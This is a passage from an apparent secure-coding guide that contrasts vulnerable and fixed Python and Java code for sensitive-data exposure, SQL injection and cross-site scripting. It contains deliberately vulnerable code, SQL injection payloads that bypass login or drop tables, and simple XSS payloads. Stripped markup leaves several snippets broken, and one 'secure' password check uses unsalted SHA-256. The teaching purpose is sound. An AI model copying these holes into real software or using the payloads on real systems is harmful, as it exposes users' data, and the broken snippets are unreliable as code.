        'password_hash': '$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewJb0Pk0l2lQu4Kq',
        'ssn': '123-45-6789',  # Sensitive data exposed!
        'credit_card': '4111-1111-1111-1111'  # Very sensitive!
    }
    return jsonify(user_data)

# VULNERABLE: Debug mode enabled with secrets
if __name__ == '__main__':
    app.run(debug=True)  # Exposes debug info including variables
```

### Python Example - Secure Code

```python
import os
import requests
import mysql.connector
from flask import Flask, request, jsonify
import logging
from cryptography.fernet import Fernet
import hashlib

app = Flask(__name__)

# SECURE: Use environment variables for secrets
DATABASE_PASSWORD = os.environ.get('DATABASE_PASSWORD')
API_KEY = os.environ.get('API_KEY')
JWT_SECRET = os.environ.get('JWT_SECRET')
ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY')

# SECURE: Validate that required environment variables are set
required_env_vars = ['DATABASE_PASSWORD', 'API_KEY', 'JWT_SECRET', 'ENCRYPTION_KEY']
for var in required_env_vars:
    if not os.environ.get(var):
        raise ValueError(f"Required environment variable {var} not set")

# SECURE: Set up proper logging (avoid logging sensitive data)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/var/log/app/app.log'),
        logging.StreamHandler()
    ]
)

# SECURE: Initialize encryption for sensitive data
fernet = Fernet(ENCRYPTION_KEY.encode())

@app.route('/connect_db')
def secure_db_connect():
    try:
        # SECURE: Use environment variable for password
        connection = mysql.connector.connect(
            host=os.environ.get('DB_HOST', 'localhost'),
            database=os.environ.get('DB_NAME', 'myapp'),
            user=os.environ.get('DB_USER', 'app_user'),
            password=DATABASE_PASSWORD,
            autocommit=True,
            use_unicode=True,
            charset='utf8mb4'
        )
        
        app.logger.info("Database connection successful")
        return "Database connected successfully"
        
    except mysql.connector.Error as e:
        # SECURE: Log error without exposing sensitive details
        app.logger.error(f"Database connection failed: Error code {e.errno}")
        return "Database connection failed", 500

@app.route('/api_call')
def secure_api_call():
    if not API_KEY:
        app.logger.error("API key not configured")
        return "Service unavailable", 503
    
    headers = {
        'Authorization': f'Bearer {API_KEY}',
        'User-Agent': 'MyApp/1.0',
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.get(
            'https://api.example.com/data', 
            headers=headers,
            timeout=10
        )
        response.raise_for_status()
        
        app.logger.info("API call successful")
        return response.json()
        
    except requests.RequestException as e:
        # SECURE: Log error without exposing sensitive headers
        app.logger.error(f"API call failed: {type(e).__name__}")
        return "External service unavailable", 502

@app.route('/user_info')
def secure_user_info():
    # SECURE: Only expose non-sensitive user data
    user_data = {
        'id': 123,
        'username': 'john_doe', 
        'email': mask_email('john@example.com'),
        'profile_complete': True,
        'last_login': '2024-01-15T10:30:00Z',
        'account_status': 'active'
        # Removed: password_hash, ssn, credit_card
    }
    
    app.logger.info(f"User info accessed for user ID: {user_data['id']}")
    return jsonify(user_data)

@app.route('/user_sensitive')
def secure_user_sensitive():
    # SECURE: Separate endpoint with additional authentication for sensitive data
    # In real app, verify JWT token and permissions here
    
    # Only return minimal sensitive data if absolutely necessary
    sensitive_data = {
        'id': 123,
        'last_four_ssn': '6789',  # Only last 4 digits
        'has_verified_identity': True,
        'account_verified': True
        # Never expose full SSN, credit card, or passwords
    }
    
    return jsonify(sensitive_data)

def mask_email(email):
    """Mask email address for privacy"""
    if '@' not in email:
        return email
    
    local, domain = email.split('@', 1)
    if len(local)  userData = new HashMap<>();
        userData.put("id", 123);
        userData.put("username", "john_doe");
        userData.put("email", maskEmail("john@example.com"));
        userData.put("profile_complete", true);
        userData.put("last_login", "2024-01-15T10:30:00Z");
        userData.put("account_status", "active");
        
        // SECURE: Convert to JSON without exposing sensitive fields
        StringBuilder json = new StringBuilder();
        json.append("{\n");
        boolean first = true;
        for (Map.Entry entry : userData.entrySet()) {
            if (!first) json.append(",\n");
            json.append(String.format("  \"%s\": ", entry.getKey()));
            
            if (entry.getValue() instanceof String) {
                json.append(String.format("\"%s\"", entry.getValue()));
            } else {
                json.append(entry.getValue());
            }
            first = false;
        }
        json.append("\n}");
        
        logger.info("User info accessed for user ID: " + userData.get("id"));
        response.getWriter().println(json.toString());
    }
    
    private void showHealthStatus(HttpServletResponse response) throws IOException {
        // SECURE: Health check without exposing sensitive configuration
        response.setContentType("application/json");
        
        Map health = new HashMap<>();
        health.put("status", "healthy");
        health.put("timestamp", new Date().toString());
        health.put("version", "1.0.0");
        health.put("environment", System.getenv("ENVIRONMENT") != null ? 
                   System.getenv("ENVIRONMENT") : "development");
        
        // Check if required environment variables are set (without exposing values)
        health.put("config_valid", validateConfigSilently());
        
        response.getWriter().println(formatHealthResponse(health));
    }
    
    private boolean validateConfigSilently() {
        return databasePassword != null && apiKey != null && 
               jwtSecret != null && encryptionKey != null;
    }
    
    private String formatHealthResponse(Map health) {
        StringBuilder json = new StringBuilder();
        json.append("{\n");
        boolean first = true;
        for (Map.Entry entry : health.entrySet()) {
            if (!first) json.append(",\n");
            json.append(String.format("  \"%s\": ", entry.getKey()));
            
            if (entry.getValue() instanceof String) {
                json.append(String.format("\"%s\"", entry.getValue()));
            } else {
                json.append(entry.getValue());
            }
            first = false;
        }
        json.append("\n}");
        return json.toString();
    }
    
    private String maskEmail(String email) {
        if (email == null || !email.contains("@")) {
            return email;
        }
        
        String[] parts = email.split("@");
        if (parts[0].length() ')
def vulnerable_get_user(username):
    # VULNERABLE: Direct string concatenation in SQL query
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)  # Dangerous!
    
    user = cursor.fetchone()
    if user:
        return jsonify({'id': user[0], 'username': user[1], 'email': user[2]})
    return "User not found"

@app.route('/login', methods=['POST'])
def vulnerable_login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # VULNERABLE: String formatting in SQL query
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    query = "SELECT id, username FROM users WHERE username = '{}' AND password = '{}'".format(
        username, password)
    
    cursor.execute(query)
    user = cursor.fetchone()
    
    if user:
        return f"Welcome {user[1]}!"
    return "Invalid credentials"

@app.route('/search')
def vulnerable_search():
    search_term = request.args.get('q', '')
    category = request.args.get('category', 'all')
    
    # VULNERABLE: Multiple injection points
    conn = sqlite3.connect('products.db')
    cursor = conn.cursor()
    
    if category == 'all':
        query = f"SELECT * FROM products WHERE name LIKE '%{search_term}%'"
    else:
        query = f"SELECT * FROM products WHERE name LIKE '%{search_term}%' AND category = '{category}'"
    
    cursor.execute(query)
    results = cursor.fetchall()
    
    return jsonify([{'id': r[0], 'name': r[1], 'category': r[2]} for r in results])

@app.route('/update_user', methods=['POST'])
def vulnerable_update_user():
    user_id = request.form.get('user_id')
    email = request.form.get('email')
    
    # VULNERABLE: Using % formatting
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    query = "UPDATE users SET email = '%s' WHERE id = %s" % (email, user_id)
    cursor.execute(query)
    conn.commit()
    
    return "User updated successfully"
```

An attacker could exploit these vulnerabilities with payloads like:
- Username: `admin' OR '1'='1' --` to bypass authentication
- Search: `'; DROP TABLE users; --` to delete data
- User ID: `1; INSERT INTO users VALUES (999, 'hacker', 'evil@hack.com'); --` to insert malicious data [19]

### Python Example - Secure Code

```python
import sqlite3
import mysql.connector
from flask import Flask, request, jsonify
import logging
import re

app = Flask(__name__)

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def get_db_connection():
    """Get database connection with proper configuration"""
    conn = sqlite3.connect('users.db')
    conn.row_factory = sqlite3.Row  # Enable column access by name
    return conn

def validate_input(input_string, pattern, max_length=100):
    """Validate input against pattern and length"""
    if not input_string or len(input_string) > max_length:
        return False
    return bool(re.match(pattern, input_string))

@app.route('/user/')
def secure_get_user(username):
    # SECURE: Input validation
    if not validate_input(username, r'^[a-zA-Z0-9_]+$', 50):
        return jsonify({'error': 'Invalid username format'}), 400
    
    # SECURE: Using parameterized queries
    conn = get_db_connection()
    cursor = conn.cursor()
    
    query = "SELECT id, username, email FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return jsonify({
            'id': user['id'], 
            'username': user['username'], 
            'email': user['email']
        })
    
    logger.info(f"User lookup failed for username: {username}")
    return jsonify({'error': 'User not found'}), 404

@app.route('/login', methods=['POST'])
def secure_login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    
    # SECURE: Input validation
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    
    if not validate_input(username, r'^[a-zA-Z0-9_]+$', 50):
        return jsonify({'error': 'Invalid username format'}), 400
    
    # SECURE: Parameterized query with password hashing
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Note: In production, use proper password hashing (bcrypt, scrypt, etc.)
    query = "SELECT id, username, password_hash FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    
    user = cursor.fetchone()
    conn.close()
    
    if user and verify_password(password, user['password_hash']):
        logger.info(f"Successful login for user: {username}")
        return jsonify({'message': f'Welcome {user["username"]}!'})
    
    logger.warning(f"Failed login attempt for username: {username}")
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/search')
def secure_search():
    search_term = request.args.get('q', '').strip()
    category = request.args.get('category', 'all').strip()
    
    # SECURE: Input validation
    if len(search_term) > 100:
        return jsonify({'error': 'Search term too long'}), 400
    
    # SECURE: Whitelist validation for category
    allowed_categories = ['all', 'electronics', 'books', 'clothing', 'home']
    if category not in allowed_categories:
        return jsonify({'error': 'Invalid category'}), 400
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # SECURE: Parameterized queries for both scenarios
    if category == 'all':
        query = "SELECT id, name, category, price FROM products WHERE name LIKE ?"
        cursor.execute(query, (f'%{search_term}%',))
    else:
        query = "SELECT id, name, category, price FROM products WHERE name LIKE ? AND category = ?"
        cursor.execute(query, (f'%{search_term}%', category))
    
    results = cursor.fetchall()
    conn.close()
    
    return jsonify([{
        'id': row['id'], 
        'name': row['name'], 
        'category': row['category'],
        'price': row['price']
    } for row in results])

@app.route('/update_user', methods=['POST'])
def secure_update_user():
    user_id = request.form.get('user_id', '').strip()
    email = request.form.get('email', '').strip()
    
    # SECURE: Input validation
    if not user_id or not user_id.isdigit():
        return jsonify({'error': 'Invalid user ID'}), 400
    
    # SECURE: Email validation
    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not validate_input(email, email_pattern, 254):
        return jsonify({'error': 'Invalid email format'}), 400
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    try:
        # SECURE: Parameterized query
        query = "UPDATE users SET email = ? WHERE id = ? AND id > 0"
        cursor.execute(query, (email, int(user_id)))
        
        if cursor.rowcount == 0:
            conn.close()
            return jsonify({'error': 'User not found or update failed'}), 404
        
        conn.commit()
        conn.close()
        
        logger.info(f"User {user_id} email updated successfully")
        return jsonify({'message': 'User updated successfully'})
        
    except sqlite3.Error as e:
        conn.rollback()
        conn.close()
        logger.error(f"Database error during user update: {e}")
        return jsonify({'error': 'Database error'}), 500

def verify_password(password, password_hash):
    """Verify password against hash (simplified for example)"""
    # In production, use bcrypt.checkpw() or similar
    import hashlib
    return hashlib.sha256(password.encode()).hexdigest() == password_hash

# SECURE: Use environment-based configuration
if __name__ == '__main__':
    app.run(debug=False, host='127.0.0.1')
```

### Java Example - Vulnerable Code

```java
import javax.servlet.http.*;
import java.sql.*;
import java.io.IOException;

public class VulnerableSQLServlet extends HttpServlet {
    
    private static final String DB_URL = "jdbc:mysql://localhost:3306/myapp";
    private static final String USER = "root";
    private static final String PASS = "password";
    
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String action = request.getParameter("action");
        String userId = request.getParameter("user_id");
        
        if ("getUser".equals(action)) {
            getUserInfo(userId, response);
        } else if ("search".equals(action)) {
            searchUsers(request, response);
        }
    }
    
    private void getUserInfo(String userId, HttpServletResponse response) 
            throws IOException {
        try {
            Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
            
            // VULNERABLE: Direct string concatenation
            String query = "SELECT * FROM users WHERE id = " + userId;
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(query);
            
            response.setContentType("text/html");
            if (rs.next()) {
                response.getWriter().println(
                    "User: " + rs.getString("username") + "" +
                    "Email: " + rs.getString("email") + "" +
                    "Balance: $" + rs.getDouble("balance") + ""
                );
            } else {
                response.getWriter().println("User not found");
            }
            
        } catch (SQLException e) {
            response.getWriter().println("Database error: " + e.getMessage());
        }
    }
    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String action = request.getParameter("action");
        
        if ("login".equals(action)) {
            authenticateUser(request, response);
        } else if ("updateBalance".equals(action)) {
            updateUserBalance(request, response);
        }
    }
    
    private void authenticateUser(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        
        try {
            Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
            
            // VULNERABLE: String concatenation in authentication query
            String query = "SELECT id, username FROM users WHERE username = '" + 
                          username + "' AND password = '" + password + "'";
            
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(query);
            
            if (rs.next()) {
                response.getWriter().println("Welcome, " + rs.getString("username") + "!");
            } else {
                response.getWriter().println("Invalid credentials");
            }
            
        } catch (SQLException e) {
            response.getWriter().println("Authentication error: " + e.getMessage());
        }
    }
    
    private void searchUsers(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        
        String searchTerm = request.getParameter("search");
        String orderBy = request.getParameter("order");
        
        try {
            Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
            
            // VULNERABLE: Multiple injection points
            String query = "SELECT username, email FROM users WHERE username LIKE '%" + 
                          searchTerm + "%' ORDER BY " + orderBy;
            
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(query);
            
            response.setContentType("text/html");
            response.getWriter().println("");
            
            while (rs.next()) {
                response.getWriter().println(
                    "" + rs.getString("username") + 
                    "" + rs.getString("email") + ""
                );
            }
            
            response.getWriter().println("");
            
        } catch (SQLException e) {
            response.getWriter().println("Search error: " + e.getMessage());
        }
    }
}
```

### Java Example - Secure Code

```java
import javax.servlet.http.*;
import java.sql.*;
import java.io.IOException;
import java.util.logging.Logger;
import java.util.logging.Level;
import java.util.regex.Pattern;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.List;

public class SecureSQLServlet extends HttpServlet {
    
    private static final Logger logger = Logger.getLogger(SecureSQLServlet.class.getName());
    private static final String DB_URL = "jdbc:mysql://localhost:3306/myapp?useSSL=true";
    private static final String USER = System.getProperty("db.user", "app_user");
    private static final String PASS = System.getProperty("db.password");
    
    // Input validation patterns
    private static final Pattern USERNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9_]{3,50}$");
    private static final Pattern EMAIL_PATTERN = Pattern.compile(
        "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    
    // Whitelist for ORDER BY clause
    private static final List ALLOWED_ORDER_COLUMNS = Arrays.asList(
        "username", "email", "created_date", "last_login");
    
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String action = request.getParameter("action");
        
        try {
            if ("getUser".equals(action)) {
                String userId = request.getParameter("user_id");
                getUserInfo(userId, response);
            } else if ("search".equals(action)) {
                searchUsers(request, response);
            } else {
                response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid action");
            }
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Error processing request", e);
            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, 
                "Internal server error");
        }
    }
    
    private void getUserInfo(String userId, HttpServletResponse response) 
            throws IOException, SQLException {
        
        // SECURE: Input validation
        if (userId == null || !userId.matches("\\d+")) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid user ID");
            return;
        }
        
        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS)) {
            // SECURE: Parameterized query
            String query = "SELECT id, username, email, created_date FROM users WHERE id = ? AND active = 1";
            
            try (PreparedStatement pstmt = conn.prepareStatement(query)) {
                pstmt.setInt(1, Integer.parseInt(userId));
                
                try (ResultSet rs = pstmt.executeQuery()) {
                    response.setContentType("application/json");
                    
                    if (rs.next()) {
                        StringBuilder json = new StringBuilder();
                        json.append("{");
                        json.append("\"id\":").append(rs.getInt("id")).append(",");
                        json.append("\"username\":\"").append(escapeJson(rs.getString("username"))).append("\",");
                        json.append("\"email\":\"").append(escapeJson(rs.getString("email"))).append("\",");
                        json.append("\"created_date\":\"").append(rs.getTimestamp("created_date")).append("\"");
                        json.append("}");
                        
                        response.getWriter().println(json.toString());
                        logger.info("User info retrieved for ID: " + userId);
                    } else {
                        response.sendError(HttpServletResponse.SC_NOT_FOUND, "User not found");
                    }
                }
            }
        }
    }
    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String action = request.getParameter("action");
        
        try {
            if ("login".equals(action)) {
                authenticateUser(request, response);
            } else if ("updateUser".equals(action)) {
                updateUserInfo(request, response);
            } else {
                response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid action");
            }
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Error processing POST request", e);
            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, 
                "Internal server error");
        }
    }
    
    private void authenticateUser(HttpServletRequest request, HttpServletResponse response) 
            throws IOException, SQLException {
        
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        
        // SECURE: Input validation
        if (username == null || password == null || 
            !USERNAME_PATTERN.matcher(username).matches()) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid credentials format");
            return;
        }
        
        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS)) {
            // SECURE: Parameterized query
            String query = "SELECT id, username, password_hash, salt FROM users WHERE username = ? AND active = 1";
            
            try (PreparedStatement pstmt = conn.prepareStatement(query)) {
                pstmt.setString(1, username);
                
                try (ResultSet rs = pstmt.executeQuery()) {
                    if (rs.next()) {
                        String storedHash = rs.getString("password_hash");
                        String salt = rs.getString("salt");
                        
                        // SECURE: Password verification with salt
                        if (verifyPassword(password, storedHash, salt)) {
                            response.setContentType("application/json");
                            response.getWriter().println(
                                "{\"message\":\"Authentication successful\",\"user_id\":" + 
                                rs.getInt("id") + "}");
                            
                            logger.info("Successful login for user: " + username);
                        } else {
                            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, 
                                "Invalid credentials");
                            logger.warning("Failed login attempt for user: " + username);
                        }
                    } else {
                        response.sendError(HttpServletResponse.SC_UNAUTHORIZED, 
                            "Invalid credentials");
                        logger.warning("Login attempt for non-existent user: " + username);
                    }
                }
            }
        }
    }
    
    private void searchUsers(HttpServletRequest request, HttpServletResponse response) 
            throws IOException, SQLException {
        
        String searchTerm = request.getParameter("search");
        String orderBy = request.getParameter("order");
        
        // SECURE: Input validation
        if (searchTerm == null || searchTerm.length() > 100) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid search term");
            return;
        }
        
        // SECURE: Whitelist validation for ORDER BY
        if (orderBy != null && !ALLOWED_ORDER_COLUMNS.contains(orderBy)) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid order parameter");
            return;
        }
        
        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS)) {
            StringBuilder queryBuilder = new StringBuilder();
            queryBuilder.append("SELECT id, username, email FROM users WHERE username LIKE ? AND active = 1");
            
            if (orderBy != null) {
                // Safe to use since we validated against whitelist
                queryBuilder.append(" ORDER BY ").append(orderBy);
            }
            
            try (PreparedStatement pstmt = conn.prepareStatement(queryBuilder.toString())) {
                pstmt.setString(1, "%" + searchTerm + "%");
                
                try (ResultSet rs = pstmt.executeQuery()) {
                    response.setContentType("application/json");
                    StringBuilder json = new StringBuilder();
                    json.append("[");
                    
                    boolean first = true;
                    while (rs.next()) {
                        if (!first) json.append(",");
                        
                        json.append("{");
                        json.append("\"id\":").append(rs.getInt("id")).append(",");
                        json.append("\"username\":\"").append(escapeJson(rs.getString("username"))).append("\",");
                        json.append("\"email\":\"").append(escapeJson(rs.getString("email"))).append("\"");
                        json.append("}");
                        
                        first = false;
                    }
                    
                    json.append("]");
                    response.getWriter().println(json.toString());
                }
            }
        }
    }
    
    private boolean verifyPassword(String password, String storedHash, String salt) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            md.update(salt.getBytes());
            md.update(password.getBytes());
            
            byte[] hashedPassword = md.digest();
            StringBuilder sb = new StringBuilder();
            for (byte b : hashedPassword) {
                sb.append(String.format("%02x", b));
            }
            
            return sb.toString().equals(storedHash);
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Password verification error", e);
            return false;
        }
    }
    
    private String escapeJson(String input) {
        if (input == null) return "";
        return input.replace("\\", "\\\\")
                   .replace("\"", "\\\"")
                   .replace("\n", "\\n")
                   .replace("\r", "\\r")
                   .replace("\t", "\\t");
    }
}
```

## 8. Cross-Site Scripting (XSS) (CWE-79)

### Overview

Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users [20]. These attacks can hijack user sessions, steal sensitive data, deface pages, or redirect users to malicious sites [20][21]. XSS attacks are particularly dangerous because they execute in the context of the victim's browser with their privileges [20].

### Python Example - Vulnerable Code

```python
from flask import Flask, request, render_template_string, Markup
import sqlite3

app = Flask(__name__)

@app.route('/search')
def vulnerable_search():
    query = request.args.get('q', '')
    
    # VULNERABLE: Direct insertion of user input into HTML
    html = f"""
    
        
            Search Results for: {query}
            You searched for: {query}
        
    
    """
    return html

@app.route('/comment', methods=['POST'])
def vulnerable_comment():
    username = request.form.get('username', '')
    comment = request.form.get('comment', '')
    
    # VULNERABLE: Storing and displaying unescaped user input
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO comments (username, comment) VALUES (?, ?)", 
                   (username, comment))
    conn.commit()
    conn.close()
    
    # VULNERABLE: Reflecting user input directly
    return f"Thank you {username}!Your comment: {comment}"

@app.route('/comments')
def vulnerable_display_comments():
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    cursor.execute("SELECT username, comment FROM comments ORDER BY id DESC LIMIT 10")
    comments = cursor.fetchall()
    conn.close()
    
    # VULNERABLE: Displaying stored user content without escaping
    html = "Recent Comments"
    for username, comment in comments:
        html += f"{username}: {comment}"
    html += ""
    
    return html

@app.route('/profile')
def vulnerable_profile():
    name = request.args.get('name', 'Guest')
    
    # VULNERABLE: Using render_template_string with user input
    template = f"""
    
        
            Welcome {name}!
            
                var userName = "{name}";
                console.log("User: " + userName);
            
        
    
    """
    return render_template_string(template)

@app.route('/redirect')
def vulnerable_redirect():
    url = request.args.get('url', '')
    
    # VULNERABLE: Open redirect with JavaScript
    return f"""
    
        
            
                window.location.href = "{url}";
            
        
    
    """
```

Attackers could exploit these vulnerabilities with payloads like:
- `alert('XSS')` for basic script injection
- `` for event-based XSS
- `javascript:alert('XSS')` in URL parameters
- `"; alert('XSS'); //` to break out of JavaScript contexts [20][22]

### Python Example - Secure Code

```python
from flask import Flask, request, render_template, escape, Markup
import sqlite3
import html
import re
import bleach
from urllib.parse import urlparse

app = Flask(__name__)

# Configure allowed HTML tags and attributes for user content
ALLOWED_TAGS = ['b', 'i', 'u', 'em', 'strong', 'p', 'br']
ALLOWED_ATTRIBUTES = {}

def sanitize_html(content):
    """Sanitize HTML content to prevent XSS"""
    return bleach.clean(content, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES)

def validate_url(url):
    """Validate URL to prevent open redirects"""
    if not url:
        return False
    
    try:
        parsed = urlparse(url)
        # Only allow http/https and specific domains
        allowed_domains = ['example.com', 'subdomain.example.com']
        
        return (parsed.scheme in ['http', 'https'] and 
                parsed.netloc in allowed_domains)
    except:
        return False

@app.route('/search')
def secure_search():
    query = request.args.get('q', '').strip()
    
    # SECURE: Input validation
    if len(query) > 100:
        return "Search query too long", 400
    
    # SECURE: Use template with automatic escaping
    return render_template('search_results.html', query=query)

@app.route('/comment', methods=['POST'])
def secure_comment():
    username = request.form.get('username', '').strip()
    comment = request.form.get('comment', '').strip()
    
    # SECURE: Input validation
    if not username or not comment:
        return "Username and comment required", 400
    
    if len(username) > 50 or len(comment) > 500:
        return "Input too long", 400
    
    # SECURE: Validate username format
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        return "Invalid username format", 400
    
    # SECURE: Sanitize comment content
    clean_comment = sanitize_html(comment)
    
    # Store in database
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO comments (username, comment) VALUES (?, ?)", 
                   (username, clean_comment))
    conn.commit()
    conn.close()
    
    # SECURE: Use template with proper escaping
    return render_template('comment_success.html', 
                         username=username, 
                         comment=clean_comment)

@app.route('/comments')
def secure_display_comments():
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    cursor.execute("SELECT username, comment FROM comments ORDER BY id DESC LIMIT 10")
    comments = cursor.fetchall()
    conn.close()
    
    # SECURE: Use template with automatic escaping
    return render_template('comments.html', comments=comments)

@app.route('/profile')
def secure_profile():
    name = request.args.get('name', 'Guest').strip()
    
    # SECURE: Input validation and sanitization
    if len(name) > 50:
        name = "Guest"
    
    # SECURE: Only allow alphanumeric characters and spaces
    name = re.sub(r'[^a-zA-Z0-9\s]', '', name)
    
    if not name:
        name = "Guest"
    
    # SECURE: Use template with proper escaping
    return render_template('profile.html', name=name)

@app.route('/api/data')
def secure_api_data():
    """Example of secure JSON API endpoint"""
    user_input = request.args.get('input', '')
    
    # SECURE: JSON responses are automatically escaped by Flask
    return {
        'status': 'success',
        'user_input': user_input,  # Automatically escaped in JSON
        'timestamp': '2024-01-15T10:30:00Z'
    }

@app.route('/redirect')
def secure_redirect():
    url = request.args.get('url', '')
    
    # SECURE: Validate URL against whitelist
    if not validate_url(url):
        return "Invalid redirect URL", 400
    
    # SECURE: Use proper redirect with validation
    return render_template('redirect.html', url=url)

# Custom Jinja2 filters for additional security
@app.template_filter('js_escape')
def js_escape_filter(text):
    """Escape text for safe insertion into JavaScript"""
    if text is None:
        return ''
    
    # Escape special characters for JavaScript context
    text = str(text)
    text = text.replace('\\', '\\\\')
    text = text.replace('"', '\\"')
    text = text.replace("'", "\\'")
    text = text.replace('\n', '\\n')
    text = text.replace('\r', '\\r')
    text = text.replace('\t', '\\t')
    text = text.replace('', '\\u003e')
    
    return text

# Example templates (would be in templates/ directory):

# templates/search_results.html
SEARCH_TEMPLATE = """



    Search Results


    Search Results for: {{ query|e }}
    You searched for: {{ query|e }}


"""

# templates/profile.html
PROFILE_TEMPLATE = """



    User Profile


    Welcome {{ name|e }}!
    
        var userName = "{{ name|js_escape }}";
        console.log("User: " + userName);
    


"""

if __name__ == '__main__':
    # SECURE: Disable debug mode in production
    app.run(debug=False, host='127.0.0.1')
```

### Java Example - Vulnerable Code

```java
import javax.servlet.http.*;
import java.io.*;
import java.sql.*;

public class VulnerableXSSServlet extends HttpServlet {
    
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String action = request.getParameter("action");
        
        if ("search".equals(action)) {
            handleSearch(request, response);
        } else if ("profile".equals(action)) {
            showProfile(request, response);
        } else if ("comments".equals(action)) {
            showComments(request, response);
        }
    }
    
    private void handleSearch(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        
        String query = request.getParameter("q");
        if (query == null) query = "";
        
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        
        // VULNERABLE: Direct output of user input without escaping
        out.println("");
        out.println("Search Results for: " + query + "");
        out.println("You searched for: " + query + "");
        
        // VULNERABLE: User input in JavaScript context
        out.println("");
        out.println("var searchQuery = '" + query + "';");
        out.println("console.log('Search: ' + searchQuery);");
        out.println("");
        
        out.println("");
    }
    
    private void showProfile(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        
        String name = request.getParameter("name");
        String bio = request.getParameter("bio");
        
        if (name == null) name = "Guest";
        if (bio == null) bio = "";
        
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        
        // VULNERABLE: Unescaped user input in multiple contexts
        out.println("");
        out.println("Profile: " + name + "");
        out.println("");
        out.println("Welcome " + name + "!");
        out.println("Bio: " + bio + "");
        
        // VULNERABLE: User input in HTML attribute
        out.println("");
        
        // VULNERABLE: User input in CSS context
        out.println("");
        out.println(".user-name:before { content: '" + name + "'; }");
        out.println("");
        
        out.println("");
    }
    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String action = request.getParameter("action");
        
        if ("comment".equals(action)) {
            handleComment(request, response);
        }
    }
    
    private void handleComment(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        
        String username = request.getParameter("username");
        String comment = request.getParameter("comment");
        
        try {
            // Store comment in database (without sanitization)
            Connection conn = DriverManager.getConnection(
                "jdbc:mysql://localhost:3306/myapp", "user", "pass");
            
            PreparedStatement stmt = conn.prepareStatement(
                "INSERT INTO comments (username, comment) VALUES (?, ?)");
            stmt.setString(1, username);
            stmt.setString(2, comment);  // Storing raw user input!
            stmt.executeUpdate();
            
            conn.close();
            
            response.setContentType("text/html");
            PrintWriter out = response.getWriter();
            
            // VULNERABLE: Reflecting user input directly
            out.println("");
            out.println("Thank you " + username + "!");
            out.println("Your comment: " + comment + "");
            out.println("Go Back");
            out.println("");
            
        } catch (SQLException e) {
            response.getWriter().println("Database error: " + e.getMessage());
        }
    }
    
